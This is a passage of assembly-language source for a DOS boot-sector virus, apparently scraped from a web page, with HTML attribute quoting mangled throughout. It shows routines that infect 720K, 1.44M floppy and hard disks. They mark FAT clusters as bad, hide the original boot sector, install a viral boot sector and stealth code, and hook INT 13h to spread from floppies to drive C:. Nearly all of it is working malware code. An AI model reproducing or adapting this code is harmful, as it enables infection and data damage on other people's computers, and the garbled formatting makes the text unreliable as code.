ax,[di+4]="" ;don't="" wipe="" out="" any="" data="" jnz="" inf720_exit="" ;if="" so,="" abort="" infection="" mov="" ax,07ff7h="" stosw="" mov="" ax,0f7ffh="" ;marking="" the="" last="" 6="" clusters="" stosw="" ;as="" bad="" mov="" ax,0000fh="" stosw="" mov="" ax,bx="" ;write="" the="" fat="" back="" to="" disk="" mov="" cx,4="" ;at="" track="" 0,="" sector="" 4,="" head="" 0="" mov="" dl,bl="" mov="" dh,0="" call="" write_disk="" ;write="" the="" fat="" back="" to="" disk="" jc="" inf720_exit="" inf720_retry:="" mov="" dl,al="" ;write="" the="" 2nd="" fat="" too,="" mov="" cx,7="" ;at="" track="" 0,="" sector="" 7,="" head="" 0="" mov="" dh,0="" call="" write_disk="" jc="" inf720_retry="" ;must="" retry,="" since="" 1st="" fat="" done="" call="" get_boot_sec="" ;read="" the="" boot="" sector="" in="" jc="" inf720_exit="" mov="" dl,al="" ;write="" the="" orig="" boot="" sector="" at="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f09h="" ;track="" 79,="" sector="" 9="" call="" write_disk="" jc="" inf720_exit="" push="" ax="" mov="" di,offset="" boot_data="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot_data="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,32h="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" byte="" ptr="" [dr_flag],2="" ;set="" proper="" diskette="" type="" pop="" ax="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" jc="" inf720_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 5="" sectors="" of="" stealth="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f04h="" ;track="" 79,="" sector="" 4="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf720_exit:="" ret="" ;all="" done="" ;*******************************************************************************="" ;this="" routine="" infects="" a="" 1.44="" megabyte="" 3="" 1/2"="" diskette.="" it="" is="" essentially="" the="" ;same="" as="" infecting="" a="" 720k="" diskette,="" except="" that="" the="" virus="" is="" placed="" in="" sectors="" ;13-17="" on="" track="" 79,="" head="" 0,="" and="" the="" original="" boot="" sector="" is="" placed="" in="" sector="" 18.="" infect_144m:="" mov="" dl,al="" ;read="" the="" fat="" from="" mov="" cx,0ah="" ;track="" 0,="" sector="" 10,="" head="" 0="" mov="" dh,0="" call="" read_disk="" mov="" bx,ax="" jc="" inf720_exit="" mov="" di,offset="" scratchbuf="" +="" 0a8h="" ;modify="" the="" fat="" in="" ram="" mov="" ax,[di]="" ;make="" sure="" nothing="" is="" stored="" and="" ax,0fff0h="" ;in="" any="" of="" these="" clusters="" or="" ax,[di+2]="" ;if="" it="" is,="" abort="" infect...="" or="" ax,[di+4]="" ;don't="" wipe="" out="" any="" data="" or="" ax,[di+6]="" or="" ax,[di+8]="" jnz="" inf144m_exit="" ;if="" so,="" abort="" infection="" mov="" ax,es:[di]="" and="" ax,000fh="" add="" ax,0ff70h="" stosw="" mov="" ax,07ff7h="" ;marking="" the="" last="" 6="" clusters="" stosw="" ;as="" bad="" mov="" ax,0f7ffh="" stosw="" mov="" ax,0ff7fh="" stosw="" mov="" ax,0ff7h="" stosw="" mov="" ax,bx="" ;write="" the="" fat="" back="" to="" disk="" mov="" cx,0ah="" ;at="" track="" 0,="" sector="" 10,="" head="" 0="" mov="" dl,bl="" mov="" dh,0="" call="" write_disk="" ;write="" the="" fat="" back="" to="" disk="" jc="" inf144m_exit="" inf144m_retry:="" mov="" dl,al="" ;write="" the="" 2nd="" fat="" too,="" mov="" cx,1="" ;at="" track="" 0,="" sector="" 1,="" head="" 1="" mov="" dh,1="" call="" write_disk="" jc="" inf144m_retry="" ;must="" retry,="" since="" 1st="" fat="" done="" call="" get_boot_sec="" ;read="" the="" boot="" sector="" in="" jc="" inf144m_exit="" mov="" dl,al="" ;write="" the="" orig="" boot="" sector="" at="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f12h="" ;track="" 79,="" sector="" 18="" call="" write_disk="" jc="" inf144m_exit="" push="" ax="" mov="" di,offset="" boot_data="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot_data="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,32h="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" byte="" ptr="" [dr_flag],3="" ;set="" proper="" diskette="" type="" pop="" ax="" call="" put_boot_sec="" ;go="" write="" it="" to="" disk="" jc="" inf144m_exit="" mov="" bx,offset="" stealth="" ;buffer="" for="" 5="" sectors="" of="" stealth="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,1="" ;head="" 1="" mov="" cx,4f0dh="" ;track="" 79,="" sector="" 13="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" inf144m_exit:="" ret="" ;all="" done="" ;read="" one="" sector="" into="" scratchbuf="" from="" the="" location="" specified="" in="" dx,cx.="" preserve="" ;ax,="" and="" return="" c="" set="" properly.="" assumes="" es="" set="" up="" properly.="" read_disk:="" push="" ax="" mov="" bx,offset="" scratchbuf="" mov="" ax,0201h="" pushf="" call="" dword="" ptr="" [old_13h]="" pop="" ax="" ret="" ;write="" one="" sector="" from="" scratchbuf="" into="" the="" location="" specified="" in="" dx,cx.="" preserve="" ;ax,="" and="" return="" c="" set="" properly.="" write_disk:="" push="" ax="" mov="" bx,offset="" scratchbuf="" mov="" ax,0301h="" pushf="" call="" dword="" ptr="" [old_13h]="" pop="" ax="" ret="" ;*******************************************************************************="" ;infect="" hard="" disk="" drive="" al="" with="" this="" virus.="" this="" involves="" the="" following="" steps:="" ;a)="" read="" the="" present="" boot="" sector.="" b)="" copy="" it="" to="" track="" 0,="" head="" 0,="" sector="" 7.="" ;c)="" copy="" the="" disk="" parameter="" info="" into="" the="" viral="" boot="" sector="" in="" memory.="" d)="" copy="" ;the="" viral="" boot="" sector="" to="" track="" 0,="" head="" 0,="" sector="" 1.="" e)="" copy="" the="" stealth="" ;routines="" to="" track="" 0,="" head="" 0,="" sector="" 2,="" 5="" sectors="" total.="" infect_hard:="" mov="" al,80h="" ;set="" drive="" type="" flag="" to="" hard="" disk="" mov="" byte="" ptr="" [dr_flag],al="" ;cause="" that's="" where="" it's="" going="" call="" get_boot_sec="" ;read="" the="" present="" boot="" sector="" mov="" bx,offset="" scratchbuf="" ;and="" go="" write="" it="" at="" push="" ax="" mov="" dl,al="" mov="" dh,0="" ;head="" 0="" mov="" cx,0007h="" ;track="" 0,="" sector="" 7="" mov="" ax,0301h="" ;bios="" write,="" for="" 1="" sector="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" push="" ax="" mov="" di,offset="" boot_data="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot_data="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot_data="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,32h="" 2="" ;copy="" boot="" sector="" disk="" info="" over="" rep="" movsw="" ;to="" new="" boot="" sector="" mov="" di,offset="" boot_start="" +="" 200h="" -="" 42h="" mov="" si,offset="" scratchbuf="" +="" 200h="" -="" 42h="" mov="" cx,21h="" ;copy="" partition="" table="" rep="" movsw="" ;to="" new="" boot="" sector="" too!="" pop="" ax="" call="" put_boot_sec="" ;write="" viral="" boot="" sector="" mov="" bx,offset="" stealth="" ;buffer="" for="" 5="" sectors="" of="" stealth="" mov="" dl,al="" ;drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" cx,0002h="" ;track="" 0,="" sector="" 2="" mov="" ax,0305h="" ;write="" 5="" sectors="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" ret="" ;*******************************************************************************="" ;this="" routine="" determines="" if="" a="" hard="" drive="" c:="" exists,="" and="" returns="" nz="" if="" it="" does,="" ;z="" if="" it="" does="" not.="" is_hard_there:="" push="" ds="" xor="" ax,ax="" mov="" ds,ax="" mov="" bx,475h="" ;get="" hard="" disk="" count="" from="" bios="" mov="" al,[bx]="" ;put="" it="" in="" al="" pop="" ds="" cmp="" al,0="" ;and="" see="" if="" al="0" (no="" drives)="" ret="" ;*******************************************************************************="" ;read="" the="" boot="" sector="" on="" the="" drive="" al="" into="" scratchbuf.="" this="" routine="" must="" ;prserve="" al!="" get_boot_sec:="" push="" ax="" mov="" bx,offset="" scratchbuf="" ;buffer="" for="" the="" boot="" sector="" mov="" dl,al="" ;this="" is="" the="" drive="" to="" read="" from="" mov="" dh,0="" ;head="" 0="" mov="" ch,0="" ;track="" 0="" mov="" cl,1="" ;sector="" 1="" mov="" al,1="" ;read="" 1="" sector="" mov="" ah,2="" ;bios="" read="" function="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" ret="" ;*******************************************************************************="" ;this="" routine="" writes="" the="" data="" in="" boot_start="" to="" the="" drive="" in="" al="" at="" track="" 0,="" ;head="" 0,="" sector="" 1="" for="" 1="" sector,="" making="" that="" data="" the="" new="" boot="" sector.="" put_boot_sec:="" push="" ax="" mov="" bx,offset="" boot_start="" mov="" dl,al="" ;this="" is="" the="" drive="" to="" write="" to="" mov="" dh,0="" ;head="" 0="" mov="" ch,0="" ;track="" 0="" mov="" cl,1="" ;sector="" 1="" mov="" al,1="" ;read="" 1="" sector="" mov="" ah,3="" ;bios="" write="" function="" pushf="" call="" dword="" ptr="" [old_13h]="" ;(int="" 13h)="" pop="" ax="" ret="" ;*******************************************************************************="" ;determine="" whether="" the="" boot="" sector="" in="" scratchbuf="" is="" the="" viral="" boot="" sector.="" ;returns="" z="" if="" it="" is,="" nz="" if="" not.="" the="" first="" 30="" bytes="" of="" code,="" starting="" at="" boot,="" ;are="" checked="" to="" see="" if="" they="" are="" identical.="" if="" so,="" it="" must="" be="" the="" viral="" boot="" ;sector.="" it="" is="" assumed="" that="" es="" and="" ds="" are="" properly="" set="" to="" this="" segment="" when="" ;this="" is="" called.="" is_vbs:="" push="" si="" ;save="" these="" push="" di="" cld="" mov="" di,offset="" boot="" ;set="" up="" for="" a="" compare="" ;="" mov="" si,offset="" scratchbuf="" +="" (offset="" boot="" -="" offset="" boot_start)="" mov="" si,offset="" sb_boot="" ;required="" instead="" of="" ^="" for="" a86="" mov="" cx,15="" repz="" cmpsw="" ;compare="" 30="" bytes="" pop="" di="" ;restore="" these="" pop="" si="" ret="" ;and="" return="" with="" z="" properly="" set="" ;*******************************************************************************="" ;*="" a="" scratch="" pad="" buffer="" for="" disk="" reads="" and="" writes="" *="" ;*******************************************************************************="" org="" 7a00h="" scratchbuf:="" ;a="" total="" of="" 512="" bytes="" db="" 3="" dup="" (0)="" sb_boot_data:="" ;with="" references="" to="" correspond="" db="" 32h="" dup="" (0)="" ;to="" various="" areas="" in="" the="" boot="" sb_dr_flag:="" ;sector="" at="" 7c00="" db="" 0="" ;these="" are="" only="" needed="" by="" a86="" sb_boot:="" ;tasm="" and="" masm="" will="" let="" you="" db="" 458="" dup="" (0)="" ;just="" do="" "db="" 512="" dup="" (0)"="" ;*******************************************************************************="" ;*="" this="" is="" the="" replacement="" (viral)="" boot="" sector="" *="" ;*******************************************************************************="" org="" 7c00h="" ;starting="" location="" for="" boot="" sec="" boot_start:="" jmp="" short="" boot="" ;jump="" over="" data="" area="" db="" 090h="" ;an="" extra="" byte="" for="" near="" jump="" boot_data:="" db="" 32h="" dup="" (?)="" ;data="" area="" and="" default="" dbt="" ;(copied="" from="" orig="" boot="" sector)="" dr_flag:db="" 0="" ;drive="" type="" flag,="" 0="360K" floppy="" ;="" 1="1.2M" floppy="" ;="" 2="720K" floppy="" ;="" 3="1.4M" floppy="" ;="" 80h="Hard" disk="" ;the="" boot="" sector="" code="" starts="" here="" boot:="" cli="" ;interrupts="" off="" xor="" ax,ax="" mov="" ss,ax="" mov="" ds,ax="" mov="" es,ax="" ;set="" up="" segment="" registers="" mov="" sp,offset="" boot_start="" ;and="" stack="" pointer="" sti="" mov="" cl,6="" ;prep="" to="" convert="" kb's="" to="" seg="" mov="" ax,[memsize]="" ;get="" size="" of="" memory="" available="" shl="" ax,cl="" ;convert="" kbytes="" into="" a="" segment="" sub="" ax,7e0h="" ;subtract="" enough="" so="" this="" code="" mov="" es,ax="" ;will="" have="" the="" right="" offset="" to="" sub="" [memsize],4="" ;go="" memory="" resident="" in="" high="" ram="" go_reloc:="" mov="" si,offset="" boot_start="" ;set="" up="" ds:si="" and="" es:di="" in="" order="" mov="" di,si="" ;to="" relocate="" this="" code="" mov="" cx,256="" ;to="" high="" memory="" rep="" movsw="" ;and="" go="" move="" this="" sector="" push="" es="" mov="" ax,offset="" reloc="" push="" ax="" ;push="" new="" far="" @reloc="" onto="" stack="" retf="" ;and="" go="" there="" with="" retf="" reloc:="" ;now="" we're="" in="" high="" memory="" push="" es="" ;so="" let's="" install="" the="" virus="" pop="" ds="" nop="" mov="" bx,offset="" stealth="" ;set="" up="" buffer="" to="" read="" virus="" mov="" al,byte="" ptr="" [dr_flag]="" ;drive="" number="" cmp="" al,0="" ;load="" from="" proper="" drive="" type="" jz="" load_360="" cmp="" al,1="" jz="" load_12m="" cmp="" al,2="" jz="" load_720="" cmp="" al,3="" jz="" load_14m="" ;if="" none="" of="" the="" above,="" ;then="" it's="" a="" hard="" disk="" load_hard:="" ;load="" virus="" from="" hard="" disk="" mov="" dx,80h="" ;hard="" drive="" 80h,="" head="" 0,="" mov="" ch,0="" ;track="" 0,="" mov="" cl,2="" ;start="" at="" sector="" 2="" jmp="" short="" load1="" load_360:="" ;load="" virus="" from="" 360="" k="" floppy="" mov="" ch,39="" ;track="" 39="" mov="" cl,4="" ;start="" at="" sector="" 4="" jmp="" short="" load="" load_12m:="" ;load="" virus="" from="" 1.2="" meg="" floppy="" mov="" ch,79="" ;track="" 80="" mov="" cl,10="" ;start="" at="" sector="" 10="" jmp="" short="" load="" load_720:="" ;load="" virus="" from="" 720k="" floppy="" mov="" ch,79="" ;track="" 79="" mov="" cl,4="" ;start="" at="" sector="" 4="" jmp="" short="" load="" ;go="" do="" it="" load_14m:="" ;load="" from="" 1.44="" meg="" floppy="" mov="" ch,79="" ;track="" 79="" mov="" cl,13="" ;start="" at="" sector="" 13="" ;="" jmp="" short="" load="" ;go="" do="" it="" load:="" mov="" dx,100h="" ;disk="" 0,="" head="" 1="" load1:="" mov="" ax,206h="" ;read="" 6="" sectors="" int="" 13h="" ;call="" bios="" to="" read="" it="" jc="" load1="" ;try="" again="" if="" it="" fails="" move_old_bs:="" xor="" ax,ax="" ;now="" move="" old="" boot="" sector="" into="" mov="" es,ax="" ;low="" memory="" mov="" si,offset="" scratchbuf="" ;at="" 0000:7c00="" mov="" di,offset="" boot_start="" mov="" cx,256="" rep="" movsw="" set_segments:="" ;change="" segments="" around="" a="" bit="" cli="" mov="" ax,cs="" mov="" ss,ax="" mov="" sp,offset="" stealth="" ;set="" up="" the="" stack="" for="" the="" virus="" push="" cs="" ;and="" also="" the="" es="" register="" pop="" es="" install_int13h:="" ;now="" hook="" the="" disk="" bios="" int="" xor="" ax,ax="" mov="" ds,ax="" mov="" si,13h*4="" ;save="" the="" old="" int="" 13h="" vector="" mov="" di,offset="" old_13h="" movsw="" movsw="" mov="" ax,offset="" int_13h="" ;and="" set="" up="" new="" interrupt="" 13h="" mov="" bx,13h*4="" ;which="" everybody="" will="" have="" to="" mov="" ds:[bx],ax="" ;use="" from="" now="" on="" mov="" ax,es="" mov="" ds:[bx+2],ax="" sti="" check_drive:="" push="" cs="" ;set="" ds="" to="" point="" here="" now="" pop="" ds="" cmp="" byte="" ptr="" [dr_flag],80h="" ;if="" booting="" from="" a="" hard="" drive,="" jz="" done="" ;nothing="" else="" needed="" at="" boot="" floppy_disk:="" ;if="" loading="" from="" a="" floppy="" drive,="" call="" is_hard_there="" ;see="" if="" a="" hard="" disk="" exists="" here="" jz="" done="" ;no="" hard="" disk,="" all="" done="" booting="" mov="" al,80h="" ;else="" load="" boot="" sector="" from="" c:="" call="" get_boot_sec="" ;into="" scratchbuf="" call="" is_vbs="" ;and="" see="" if="" c:="" is="" infected="" jz="" done="" ;yes,="" all="" done="" booting="" call="" infect_hard="" ;else="" go="" infect="" hard="" drive="" c:="" done:="" mov="" si,offset="" part="" ;clean="" partition="" data="" out="" of="" mov="" di,offset="" part+1="" ;memory="" image="" of="" boot="" sector="" mov="" cx,3fh="" ;so="" it="" doesn't="" get="" spread="" to="" mov="" byte="" ptr="" [si],0="" ;floppies="" when="" we="" infect="" them="" rep="" movsb="" xor="" ax,ax="" ;now="" go="" execute="" old="" boot="" sector="" push="" ax="" ;at="" 0000:7c00="" mov="" ax,offset="" boot_start="" push="" ax="" retf="" org="" 7dbeh="" part:="" db="" 40h="" dup="" (?)="" ;partition="" table="" goes="" here="" org="" 7dfeh="" db="" 55h,0aah="" ;boot="" sector="" id="" goes="" here="" endcode:="" ;label="" for="" the="" end="" of="" boot="" sec="" comseg="" ends="" end="" start="" =""></8.></64k>